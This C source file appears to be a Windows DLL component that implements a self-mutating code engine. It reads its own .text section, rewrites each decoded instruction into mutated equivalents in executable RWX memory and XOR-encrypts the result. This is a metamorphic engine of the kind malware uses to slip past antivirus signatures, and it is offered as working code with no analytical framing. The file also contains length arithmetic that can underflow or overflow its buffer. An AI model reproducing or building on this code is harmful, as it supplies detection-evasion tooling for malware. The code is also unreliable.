#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "engine.h"
#include "mutate.h"
#include "isa.h"

#define MAX_INST_SIZE 15
#define MAX_MUTATED 4
#define XOR_KEY 0x5A

void xor_encrypt(uint8_t *data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= key;
    }
}

__declspec(dllexport) uint8_t* __stdcall mutate_self_text(size_t *out_len) {
    uint8_t *base = (uint8_t *)GetModuleHandle(NULL);
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    uint8_t *text = NULL;
    DWORD text_size = 0;

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            text = base + sections[i].VirtualAddress;
            text_size = sections[i].Misc.VirtualSize;
            break;
        }
    }

    if (!text || text_size == 0) return NULL;

    uint8_t *mutated = (uint8_t *)VirtualAlloc(NULL, text_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mutated) return NULL;

    size_t in_off = 0, out_off = 0;

    while (in_off < text_size) {
        struct Instruction inst;
        int decoded = decode_instruction(&text[in_off], &inst);
        if (decoded <= 0) {
            mutated[out_off++] = text[in_off++];
            continue;
        }

        struct Instruction mutated_inst[MAX_MUTATED];
        int count = mutate_multi(&inst, mutated_inst, MAX_MUTATED);
        int written = 0;

        if (count > 0) {
            for (int i = 0; i < count; ++i) {
                uint8_t encoded[MAX_INST_SIZE] = {0};
                int len = encode_instruction(&mutated_inst[i], encoded);
                memcpy(mutated + out_off, encoded, len);
                out_off += len;
                written += len;
            }
            memset(mutated + out_off, 0x90, decoded - written);
            out_off += (decoded - written);
        } else {
            mutate_opcode(&inst);
            uint8_t encoded[MAX_INST_SIZE] = {0};
            int len = encode_instruction(&inst, encoded);
            memcpy(mutated + out_off, encoded, len);
            out_off += len;
        }

        in_off += decoded;
    }

    xor_encrypt(mutated, out_off, XOR_KEY);
    *out_len = out_off;
    return mutated;
}
